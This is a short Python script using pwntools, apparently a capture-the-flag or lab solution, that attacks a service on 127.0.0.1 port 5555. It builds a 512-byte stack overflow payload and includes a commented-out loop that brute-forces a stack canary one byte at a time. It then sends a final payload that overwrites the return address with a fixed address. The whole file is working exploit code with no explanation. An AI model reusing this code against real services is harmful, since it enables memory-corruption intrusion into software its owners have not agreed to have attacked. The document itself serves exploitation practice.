from pwn import *
from time import sleep

payload = b'A'*512+b'\x00\xac\x90r'
padding = b'\0'*12
canary = [0]
'''
for i in range(3):
    a = 0x0
    while (a<0xff):
        p = remote('127.0.0.1', 5555)
        print(p.recv())
        p.send(payload+chr(a))
        if b'Come back soon!' in p.recvall():
            print('hahaha: ', a)
            break
        print(a)
        a+=1
        p.close()
    payload+=chr(a)
    canary.append(a)
'''
print(payload)
print('[+] Canary: ', bytes(canary))

p = remote('127.0.0.1', 5555)
print(p.recv())
final = payload+p32(0x08048855)*2+p32(1)+p32(0x08048855)
p.sendline(final)
print(p.recvall())
